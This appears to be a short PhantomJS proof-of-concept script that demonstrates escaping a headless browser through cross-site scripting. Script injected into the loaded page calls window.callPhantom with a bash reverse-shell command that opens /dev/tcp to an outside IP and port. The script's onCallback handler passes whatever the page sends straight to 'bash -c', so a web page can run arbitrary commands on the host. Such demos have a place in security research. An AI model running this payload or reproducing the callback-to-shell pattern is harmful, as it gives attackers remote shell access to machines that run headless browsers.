
var page = require('webpage').create();
var process = require("child_process");
var spawn = process.spawn;
var execFile = process.execFile;

page.onConsoleMessage = function(msg) {
    console.log(msg);
};

page.open("http://webscantest.com/rest/demo/blind.php", function(status) {
    if ( status === "success" ) {
        //this is the demo payload...
        page.evaluate(function() {
            console.log('headless browser XSS demo. (phantom hunter)');
            if (typeof window.callPhantom === 'function') {
            	console.log('dropping shell...');
                window.callPhantom("0<&161-;exec 161<>/dev/tcp/192.168.68.130/4444;sh <&161 >&161 2>&161");
            }
        });
    }
});

page.onCallback = function(data) {
  	spawn("bash",["-c",data],{ stdio: 'inherit' });
};

